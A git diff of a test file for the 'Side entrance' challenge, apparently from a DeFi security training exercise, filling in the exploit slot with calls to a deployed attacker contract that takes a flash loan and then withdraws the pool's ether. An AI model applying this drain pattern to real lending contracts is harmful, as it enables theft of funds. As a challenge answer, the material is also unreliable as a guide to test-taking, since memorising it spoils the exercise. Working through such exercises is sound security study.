@@ -12,12 +12,16 @@ describe('[Challenge] Side entrance', function () {
         [deployer, attacker] = await ethers.getSigners();
 
         const SideEntranceLenderPoolFactory = await ethers.getContractFactory('SideEntranceLenderPool', deployer);
+        const AttackerFactory = await ethers.getContractFactory('Attacker', deployer);
         this.pool = await SideEntranceLenderPoolFactory.deploy();
         
+        this.borrower = await AttackerFactory.deploy(); 
+
         await this.pool.deposit({ value: ETHER_IN_POOL });
 
         this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);
-
+        
+        console.log(this.pool.address);
         expect(
             await ethers.provider.getBalance(this.pool.address)
         ).to.equal(ETHER_IN_POOL);
@@ -25,6 +29,8 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.borrower.takeLoan(this.pool.address, ETHER_IN_POOL);
+        await this.borrower.connect(attacker).withdraw(this.pool.address);
     });
 
     after(async function () {
